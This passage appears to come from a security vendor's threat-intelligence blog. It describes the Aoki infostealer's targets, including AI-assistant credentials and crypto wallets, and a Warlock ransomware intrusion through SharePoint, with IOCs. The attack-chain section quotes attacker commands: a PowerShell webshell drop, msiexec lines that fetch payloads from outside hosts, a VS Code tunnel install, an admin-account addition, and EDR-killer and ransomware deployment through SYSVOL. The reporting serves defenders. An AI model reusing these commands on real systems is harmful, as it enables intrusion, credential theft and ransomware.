Avast/AVG/CCleaner browsers; Kinza; Sidekick; Arc; Thorium; DuckDuckGo; Ghostery; Lunascape; Mercury; Edge WebView2; Firefox; Waterfox; LibreWolf; Pale Moon; Basilisk; SeaMonkey, and Floorp.\u003c/li\u003e\u003cli data-list-item-id=\"e6637d7e3a9bd8b8cf2a0983b557b3524\"\u003eWallet browser extensions, including: MetaMask; MetaMask (Edge); Phantom; TronLink; Coinbase; Binance; Trust; Exodus; Brave; Ronin; Solflare; Slope; Rabby; Terra Station; Keplr; Sollet; Coin98; XDEFI; KardiaChain; Nami; Maiar; Temple; Yoroi; Guarda; EVER; Jaxx Liberty; BitPay; Wombat; Oxygen; Crocobit; Finnie; Kaikas; BOLT X; Liquality; Leaf; Clover; Math; GeroWallet; HashPack; Talisman; SubWallet; Polkadot{.js}; Martian; Pontem; Petra; Fewcha; OKX; Atomic; Electrum; Electrum-LTC; Ethereum keystore; Zcash; Armory; Bytecoin; Jaxx; Guarda; Coinomi; Wasabi; Dogecoin; Dash; Litecoin; Bitcoin Core; Monero; Daedalus; Binance; Ledger Live, and TokenPocket.\u003c/li\u003e\u003cli data-list-item-id=\"e0677f2b6fd182008d11a9645e5ea5b33\"\u003eIt also looks for files with the following in the name: mnemonic; recovery; privatekey; private_key; passphrase; backup; keystore; secret; 12word; 24word, wallet or phrase.\u003c/li\u003e\u003cli data-list-item-id=\"e3acc28847f8761b7443d25410d3c50a7\"\u003eSteals Discord tokens from Discord, PTB, Canary, Development and Lightcord.\u003c/li\u003e\u003cli data-list-item-id=\"ee787b22554d4e6dbb08efa00e3d705db\"\u003eSteals Discord tokens and files from Vesktop; Legcord; Equicord; ArmCord; WebCord; Dorion; Abaddon; GoofCord; Spacebar; Vencord; BetterDiscord; Replugged, and OpenAsar.\u003c/li\u003e\u003cli data-list-item-id=\"e9ef54f96ace2a940692dd0b1a707f565\"\u003eSteals from Telegram-related messaging services such as tdata; 64Gram; AyuGram; Kotatogram; Nekogram; Extragram; iMe, and Unigram.\u003c/li\u003e\u003cli data-list-item-id=\"e9963ba1642fb6765b48f9c79e431946d\"\u003eSteals gaming-related files for Steam; Roblox; Epic Games; Battle.net; Riot; Minecraft; GOG; Origin, and Ubisoft.\u003c/li\u003e\u003cli data-list-item-id=\"ea162d7b58de9822d6a06d095862b88be\"\u003eSteals Outlook passwords from the registry and Mozilla Thunderbird profiles.\u003c/li\u003e\u003cli data-list-item-id=\"ef07cd1242e5238f6f8e21e411e76327f\"\u003eSteals saved information from file transfer programs, including: FileZilla; WinSCP; CoreFTP; FlashFXP, and SmartFTP.\u003c/li\u003e\u003cli data-list-item-id=\"ed77f0d298ec997ea38efb37a06448ee4\"\u003eSteals information from OpenVPN; NordVPN; ProtonVPN; PIA; Surfshark, and Windscribe.\u003c/li\u003e\u003cli data-list-item-id=\"e2bdb0ef405360a94be0789550b2aa7c7\"\u003eSteals from password managers, including: KeePass config; Bitwarden; 1Password; Dashlane; RoboForm; NordPass, and Sticky Password.\u003c/li\u003e\u003cli data-list-item-id=\"ecc67e5e331a3e03cc59187c7accfb8bd\"\u003eIt also records which security products are installed on a machine.\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eAoki collects the available data from victim machines and sends it to its C\u0026amp;C server, using a /gate endpoint. Most of the newer samples used one domain, while two newer samples used a domain of their own. Older samples used an IP address and port 8080 over unencrypted HTTP.\u003c/p\u003e\u003ch2\u003eWhy AI credentials are valuable\u003c/h2\u003e\u003cp\u003eAPI keys and Open Authorization (OAuth) or session tokens allow malicious activity to be carried out under a legitimate developer's identity and API quota. They can also expose connected repositories, cloud services and CI/CD pipelines linked to that account, and may bypass safeguards that assume requests originate from a trusted user.\u003c/p\u003e\u003cp\u003eThe malware stole credential, token and session files rather than source code. The exception is the local state database used by Cursor, which can cache chat context and code snippets.\u003c/p\u003e\u003ch2\u003eA little-documented family\u003c/h2\u003e\u003cp\u003eThe name of this infostealer comes from a longer name (Aokigahara) in a string used by the malware during its decryption process. While there has been\u0026nbsp;\u003ca href=\"https://www.cyfirma.com/news/weekly-intelligence-report-28-aug-2026/\"\u003esome limited publication\u003c/a\u003e about this malware, its functionality has not been extensively documented, and its targeting of AI assistants is a new development that hasn’t previously been reported. We do not know what threat group may be behind this malware and there are no indications that it has links to any existing malware family.\u003c/p\u003e\u003cp\u003eAokigahara is the name of a\u0026nbsp;\u003ca href=\"https://en.wikipedia.org/wiki/Aokigahara\"\u003every famous forest in Japan\u003c/a\u003e, but it’s not clear if that provides any clues as to the origins of the malware’s developers.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eSignificance\u003c/h2\u003e\u003cp\u003eWhile payment card data and cryptocurrency wallets have long been a mainstay for information stealing malware, this development suggests AI credentials may be considered just as valuable for attackers. Like card data, a stolen AI key can be cashed in directly, either through resale or by running up usage on the victim's account, a practice sometimes called LLMjacking. Unlike card data, it can also give an attacker a route into the developer's wider environment.\u003c/p\u003e\u003cp\u003eThe rest of Aoki's target list points to a financial motive, with\u0026nbsp;a strong focus on cryptocurrency-related wallets and extensions. The attackers are also clearly interested in credentials and accessing information about victims from the likes of Telegram and Discord sessions, which could potentially also give them access to other victims in the form of the victims’ contacts.\u003c/p\u003e\u003cp\u003eAoki is a highly-capable and multi-functional infostealer whose capabilities still appear to be in active development. \u0026nbsp;\u003c/p\u003e\u003ch2\u003eProtection\u003c/h2\u003e\u003cp\u003eIf an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. Symantec detects this family as Infostealer.Aoki.\u003c/p\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003ch2\u003eIndicators of Compromise\u003c/h2\u003e\u003cp\u003e\u003cstrong\u003eFile indicators\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e752c8e64af60960b85cf00e4bd34eb459e24b7939464f718ec18494df43b4b69 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003ebf037920d39b85572ec7e53b51f09c28198c2c0afbc7c7d6cf639b1f047caebf – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e0adc8e83b2416c275b1283916d70568faddeb6d718eb45f9addfb0938db245b3 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e6655b89b9885483d459c73f2a52e3cec121de5c5956172a8676a0f4c2de94999 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e780bbdbb119befd4eb16e0c2ec0c64e7bedc1b53ce4f85804aea091a6e3af519 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e2fb80e2221bd304e7cd5ac04169e71807ad92d19836f1aaf7885295cb90b2d94 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e73dbac0907e8a092cd978f2787ab1994946f5da1e08f2bdbd05ea52e80cdb896 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e07bc2e3a1d14743cc44f1dc4c78d15d0f2b458b39fb48422b13df40fc662ba21 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003ec533570fd7cd7eaf5478317b03ea5750d03797aa4d11ebd96555b6cb708c63f2 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e6350dfee6975a9b159c5a57a3e97f757b0b02fd2dc708016fa6d7270e720c865 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e36af3acc78058023cdcf9307bc15be640be9425de97e574fdaf42d03d308725b – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e039240551f88b0064b2615dffdc1321b1e7c58e3f617ac138a65a6d59400b331 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e0e38bd3c30a4ca08641240ce95b5b6ba593e131213ca1b2a28da4e0385fcabc4 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e3b4547f0d7549274f366cd9568b3d302c1e80e1b89359da681beb47260ec7975 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003eb590235493487c51f7050b341c9b2450e4f761ad6055207e4f6daf0cecae271c – Infostealer.Aoki\u003c/p\u003e\u003cp\u003ee374f9ff5094f728528efa566c3de1b7fea7d95f497242a01fffa6c70b5eb768 – Infostealer.Aoki\u003c/p\u003e\u003cp\u003ef779314b1a5a0b297fd4e2a5f9c1e40d387b3e7c401d42324b556a70f813840e – Infostealer.Aoki\u003c/p\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eNetwork IOCs\u003c/strong\u003e\u003c/p\u003e\u003cp\u003edobeqnesmot[.]cc\u003c/p\u003e\u003cp\u003ehjazfioe[.]surf\u003c/p\u003e\u003cp\u003eneihite[.]cc\u003c/p\u003e\u003cp\u003ehxxps://dobeqnesmot[.]cc/gate\u003c/p\u003e\u003cp\u003ehxxps://hjazfioe[.]surf/gate\u003c/p\u003e\u003cp\u003ehxxps://neihite[.]cc/gate\u003c/p\u003e28:T428e,\u003ch2\u003eKey findings\u003c/h2\u003e\u003cul\u003e\u003cli data-list-item-id=\"ea0f0fe41754860b5951d3fe136aaa734\"\u003eWarlock first came to prominence via the exploitation of a Microsoft SharePoint “ToolShell” exploit chain.\u003c/li\u003e\u003cli data-list-item-id=\"eb4b2812aaf55d4d1a1d87b880d7c876e\"\u003eWarlock is developed by a China-nexus threat actor Symantec calls Longlegs (aka Storm-2603). Symantec has previously tied this group to older activity clusters known as CL-CRI-1040, CamoFei, and ChamelGang.\u003c/li\u003e\u003cli data-list-item-id=\"eb8c0cc3c953d3870f080015127a108d9\"\u003eIn the past two months, Longlegs has attacked at least four organizations, including two critical infrastructure operators (a water utility and a telecommunications provider), a regional government body, and a university. Victims were in Portuguese- and Spanish-speaking countries, spanning Europe, Africa, and Latin America.\u003c/li\u003e\u003cli data-list-item-id=\"eedb6b225e47c76591669877fb6c1f647\"\u003eThe group continues to favor SharePoint-related vulnerabilities to gain initial access to targeted organizations.\u003c/li\u003e\u003cli data-list-item-id=\"e4185a4d9b2bc2bb7cf2bfb48ffce3e7a\"\u003eLonglegs abuses a vulnerable, signed driver (K7RKScan) to disable security software before deploying ransomware, and has also been observed abusing Visual Studio Code's tunneling feature for covert remote access.\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThe China-nexus group behind Warlock ransomware is still breaking into organizations through Microsoft SharePoint vulnerabilities, a tactic that brought it to prominence a year ago. In the past two months, the group, which Symantec tracks as Longlegs (aka Storm-2603), attacked at least four organizations in Portuguese- and Spanish-speaking countries across Europe, Africa, and Latin America. The victims included two critical infrastructure operators, a water utility and a telecommunications provider, along with a regional government body and a university.\u003c/p\u003e\u003cp\u003eWarlock emerged in June 2025 and hit the headlines weeks later, when attackers deploying it were found exploiting zero-day vulnerabilities in Microsoft SharePoint Server,\u0026nbsp;\u003ca href=\"https://www.security.com/threat-intelligence/toolshell-zero-day-sharepoint-cve-2025-53770\"\u003edubbed \"ToolShell\"\u003c/a\u003e (\u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-49704\"\u003eCVE-2025-49704\u003c/a\u003e,\u0026nbsp;\u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-49706\"\u003eCVE-2025-49706\u003c/a\u003e,\u0026nbsp;\u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-53770\"\u003eCVE-2025-53770\u003c/a\u003e, and\u0026nbsp;\u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-53771\"\u003eCVE-2025-53771\u003c/a\u003e). Those flaws likely remain in the group's arsenal, alongside newer SharePoint flaws, which the U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned about in an\u0026nbsp;\u003ca href=\"https://www.cisa.gov/news-events/alerts/2026/07/14/cisa-urges-sharepoint-hardening-after-new-exploitations\"\u003eadvisory published in July 2026\u003c/a\u003e.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn one intrusion against a critical infrastructure operator, the attackers pushed a tool designed to disable security software to at least 40 hosts within about two hours, then deployed Warlock on at least 33 hosts by staging it in the domain's SYSVOL share, where ordinary domain replication delivered it to machines.\u003c/p\u003e\u003ch2\u003eTargeting\u003c/h2\u003e\u003cp\u003eThe concentration of recent victims in Portuguese- and Spanish-speaking countries is noteworthy. Warlock ransomware activity has previously been observed against organizations in a wider range of countries, including the United States, Brazil, India, Russia, Taiwan, and Japan.\u003c/p\u003e\u003ch3\u003eInitial access via SharePoint exploitation\u003c/h3\u003e\u003cp\u003eLonglegs typically gains initial access by exploiting multiple vulnerabilities\u0026nbsp;in on-premises Microsoft SharePoint Server deployments. Once inside, the group drops a webshell into the SharePoint LAYOUTS directory for multiple SharePoint versions at once, ensuring the webshell will function regardless of which version is actually installed. The webshell's function is to harvest the SharePoint farm's ASP.NET machine keys, which the attackers then use to forge a validly signed payload that achieves remote code execution inside the SharePoint application pool.\u003c/p\u003e\u003ch3\u003eDLL sideloading and defense evasion\u003c/h3\u003e\u003cp\u003eThe group uses DLL sideloading to load malicious code into memory, and downloads follow-on payloads from legitimate cloud file-sharing and storage services such as catbox[.]moe and wasabisys[.]com, blending its network activities into normal traffic to evade detection. To disable security software ahead of deploying ransomware, Longlegs abuses K7RKScan, a signed but vulnerable driver (\u003ca href=\"https://nvd.nist.gov/vuln/detail/cve-2025-1055\"\u003eCVE-2025-1055\u003c/a\u003e) that can be used to terminate protected security processes at the kernel level, a clear example of the bring-your-own-vulnerable-driver (BYOVD) technique.\u003c/p\u003e\u003ch3\u003eLiving off the land and covert remote access\u003c/h3\u003e\u003cp\u003eLonglegs makes heavy use of living-off-the-land tooling to carry out reconnaissance and execute commands on compromised hosts. The group has also been observed abusing Visual Studio Code's built-in tunnel feature, installing the code-insiders.exe binary as a service to establish covert remote network access that blends into traffic that typically originates from developer or administrator workstations.\u003c/p\u003e\u003ch3\u003eRansomware deployment via SYSVOL\u003c/h3\u003e\u003cp\u003eTo deploy ransomware at scale, Longlegs stages its payloads inside the compromised domain's SYSVOL share, a location that is automatically replicated to every domain controller and readable domain-wide. This lets the group push the ransomware out for execution across many machines on a victim's network at once, rather than one host at a time.\u003c/p\u003e\u003ch2\u003eAttack chain: Intrusion against a critical infrastructure organization\u003c/h2\u003e\u003cp\u003eIn recent campaigns, the initial infection vector used by the attackers was likely exploitation of vulnerabilities in Microsoft SharePoint Server.\u0026nbsp;The first observed malicious activity occurred on July 22, 2026, when a webshell was installed on the SharePoint server (Computer 1):\u003c/p\u003e\u003cp\u003e\u003ccode\u003epowershell -nop -c \"[IO.File]::WriteAllBytes('CSIDL_PROGRAM_FILES_COMMON\\microsoft shared\\web server extensions\\14\\template\\layouts\\layout2sp.aspx',[Convert]::FromBase64String('\u0026lt;base64 ASPX payload\u0026gt;'))\"\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eMalicious activity resumed on July 24 when a number of reconnaissance commands (net user /domain and whoami) were run on a second SharePoint host (Computer 2).\u0026nbsp;\u003c/p\u003e\u003cp\u003eLater the same day, the attackers deleted a handful of numerically-named files from the Public profile and ProgramData directories on both Computer 1 and Computer 2, including a file named doexeloc.dll, apparently tidying up early staging artifacts.\u003c/p\u003e\u003cp\u003eShortly afterwards, the attackers deployed two executables named ssvagent.exe and logger.exe in a subdirectory of the Windows system folder (CSIDL_SYSTEM\\0409\\) on Computer 2 before being copied into ProgramData. The executables appeared to be used for DLL-sideloading since two DLLs were deployed alongside them (gsdll64.dll.tmp and doexeloc.dll.tmp). A separate side-loading pair was dropped directly by the SharePoint worker process on Computer 1 around the same time: doexe.exe, alongside another DLL file, doexeloc.dll. At the same time the attackers ran nltest /domain_trusts to enumerate the victim's Active Directory domain trust relationships.\u003c/p\u003e\u003cp\u003e\u003ccode\u003e\"CSIDL_SYSTEM\\nltest.exe\" /domain_trusts\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThree days later, on July 27, Computer 2 issued an outbound web request to a subdomain of oastify.com, the domain used by vulnerability detection service Burp Collaborator for out-of-band interaction testing:\u003c/p\u003e\u003cp\u003e\u003ccode\u003epowershell.exe -NoProfile -NonInteractive -Command Invoke-WebRequest -UseBasicParsing 'http://www.[TARGET_DOMAIN].{RANDOM].oastify[.]com'\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe target’s own domain name was baked into the collaborator subdomain, which is consistent with a scanning tool using a per-target canary URL to confirm that a specific host had successfully executed injected code, rather than any legitimate business purpose.\u003c/p\u003e\u003cp\u003eOn the morning of July 28, the attackers returned to Computer 2 to re-test the webshell. The exploitation chain proper began that afternoon. Computer 1 executed the following base64-encoded PowerShell command, repeated at regular intervals:\u003c/p\u003e\u003cp\u003e\u003ccode\u003e\"CSIDL_SYSTEM\\cmd.exe\" /c powershell.exe -NoProfile -NonInteractive -[void][Reflection.Assembly]::Load('System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35')\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe command loads an assembly whose exposed types provide the deserialization gadget that is used to turn a forged, machine-key-signed __VIEWSTATE payload into arbitrary code execution inside the SharePoint application pool. The same sequence also fired on Computer 2 twice that afternoon.\u003c/p\u003e\u003cp\u003eWith code execution established, the attackers moved to fetch follow-on payloads. Computer 2 ran msiexec against two separate URLs in immediate succession, and a third, differently-named package eighty minutes later:\u003c/p\u003e\u003cp\u003e\u003ccode\u003emsiexec.exe /q /i \"https://litter.catbox[.]moe/6f5tdt.msi\" msiexec.exe /q /i \"https://s3.wasabisys[.]com/fortifs/vamd64.msi\" msiexec /q /i https://xn8xyt-drop.s3.wasabisys[.]com/xn8xyt.msi\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eTwo different public hosting services and three distinct package names within the space of ninety minutes suggests the attackers had more than one payload ready to go and were not relying on a single point of delivery.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe intrusion then broadened from the two initial SharePoint servers to the wider domain. Later that day and into the next (July 29) the attackers repeatedly added a domain account named SPSEPRDSetup to the local Administrators group on three further hosts (Computer 3, Computer 4, and Computer 5):\u003c/p\u003e\u003cp\u003e\u003ccode\u003enet localgroup administrators SPSEPRDSetup /add\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe account name is likely an attempt at masquerading. SharePoint commonly provisions service accounts with names following an SPS/SP-prefixed setup.\u003c/p\u003e\u003cp\u003eOn Computer 4, the attackers installed a persistence and remote-access mechanism of a different kind, using Visual Studio Code's built-in tunnel feature rather than a bespoke remote-access tool:\u003c/p\u003e\u003cp\u003e\u003ccode\u003e\"CSIDL_WINDOWS\\debug\\code-insiders.exe\" tunnel service install --accept-server-license-terms\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eBecause the VS Code Insiders binary is signed by Microsoft and the tunnel relays through Microsoft's own infrastructure, this approach can blend more easily into the kind of outbound traffic already expected from developer or IT-administrator workstations.\u003c/p\u003e\u003cp\u003eLater that evening Computer 2 ran NetExec (nxc.exe), the open-source, actively maintained successor to the CrackMapExec\u0026nbsp;penetration testing framework. It was used for Active Directory enumeration, credential spraying, and remote command execution, suggesting the attackers were now mapping and moving across the wider domain.\u003c/p\u003e\u003cp\u003eThrough July 30 and into the early hours of July 31, the only activity recorded was the doexeloc.dll/doexe.exe side-loading pair reappearing on Computer 1, consistent with a side-loaded component continuing to run in the background.\u003c/p\u003e\u003cp\u003eThe intrusion moved to its final phase in the early hours of July 31. The attackers pushed an AV/EDR-killing tool (a.exe), which likely leveraged a vulnerable driver, out to multiple hosts in rapid succession, using a consistent one-line pattern that mapped a network share hosted on an internal IP address, copied a local tool set from it, and launched it:\u003c/p\u003e\u003cp\u003e\u003ccode\u003e\"\u003cem\u003e CSIDL_WINDOWS \\cmd.exe\" /c net use \\\\\u003c/em\u003e[IP_ADDRESS] [REMOVED] /user:[REMOVED] \u0026amp; copy \\\\[IP_ADDRESS]\\av\\* CSIDL_PROFILE\\public /y \u0026amp; start /B cmd /c \"c:\\users\\public\\a.exe log 2\u0026gt;nul || exit\"\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe identity of the vulnerable driver remains unknown but in other recent attacks, the group used the K7RKScan vulnerable driver. A similar command ran on Computer 4 and Computer 6, and the resulting AV/EDR Killer execution was recorded on at least 40 further hosts within about two hours, indicating the tool was pushed out across almost the entire environment rather than a handful of targeted machines.\u003c/p\u003e\u003cp\u003eThe Warlock ransomware began appearing almost as soon as protection was disabled on each host. Two binaries, run.exe and rune.exe, together with a ransom note titled \"how to restore your files.txt,\" were recorded on at least 33 hosts across the organization.\u003c/p\u003e\u003cp\u003e\u003ccode\u003e\"CSIDL_SYSTEM\\cmd.exe\" /c copy \\\\[REMOVED]\\SYSVOL\\[VICTIM DOMAIN]\\scripts\\run\\* CSIDL_PROFILE\\public /y \u0026amp; start /B cmd /c \"c:\\users\\public\\run.exe 2\u0026gt;nul || exit\" \u0026amp; start /B cmd /c \"c:\\users\\public\\rune.exe 2\u0026gt;nul || exit\"\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eStaging the payload inside the domain's SYSVOL share, a location that is automatically replicated to every domain controller and readable domain-wide, is a known method of pushing a payload out for execution by a logon script or Group Policy object across an entire network at once, rather than one host at a time.\u0026nbsp;\u003c/p\u003e\u003cp\u003eData from three further hosts directly captured this mechanism in action, recording the Distributed File System Replication service (dfsrs.exe), the process responsible for replicating SYSVOL between domain controllers, as the parent that delivered run.exe and rune.exe from the same\u0026nbsp; CSIDL_WINDOWS \\ SYSVOL\\domain\\scripts\\run path, confirming that the payload reached those hosts via ordinary SYSVOL replication rather than a separate push mechanism.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eSignificance\u003c/h2\u003e\u003cp\u003eLonglegs' continued activity, more than a year after Warlock ransomware first came to prominence, shows that exploitation of ToolShell and other related-SharePoint vulnerabilities remains a viable initial access route for attackers SharePoint deployments that have not been patched or otherwise mitigated.\u003c/p\u003e\u003cp\u003eThe apparent recent focus on Portuguese- and Spanish-speaking countries suggests either an opportunistic targeting pattern driven by exposed, vulnerable SharePoint servers, or a more deliberate tasking. The inclusion of critical infrastructure operators among the victims is a reminder of the potential real-world consequences of ransomware attacks that succeed against essential services.\u003c/p\u003e\u003ch2\u003e\u0026nbsp;\u003c/h2\u003e\u003ch2\u003eProtection\u003c/h2\u003e\u003cp\u003eSymantec CBX, our unified XDR platform, provides multiple layers of defense against attacks like this. Its Adaptive Protection capability can automatically flag and block anomalous use of legitimate living-off-the-land tools (net, whoami, nltest). CBX's Threat Tracer gives analysts a single view of an attacker's full workflow, making it easier to spot early footholds before they escalate to domain-wide SYSVOL staging. Its Incident Prediction feature can anticipate an attacker's likely next moves, while the AI Security Assistant matches observed behavior against known ransomware TTPs, helping teams intervene before Warlock deploys at scale. To find out more \u003ca href=\"https://www.security.com/feature-stories/symantec-cbx-here\"\u003eread our blog: Symantec CBX is Here\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eIf an indicator of compromise (IOC) is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\u003c/p\u003e\u003ch2\u003e\u0026nbsp;\u003c/h2\u003e\u003ch2\u003eIndicators of Compromise\u003c/h2\u003e\u003ch3\u003e\u0026nbsp;\u003c/h3\u003e\u003ch3\u003eFile indicators\u003c/h3\u003e\u003cp\u003e116ca4e88a1bcebb6c0da7fb431c8eca7b8ef3f9767194820c56091972ccac2c -
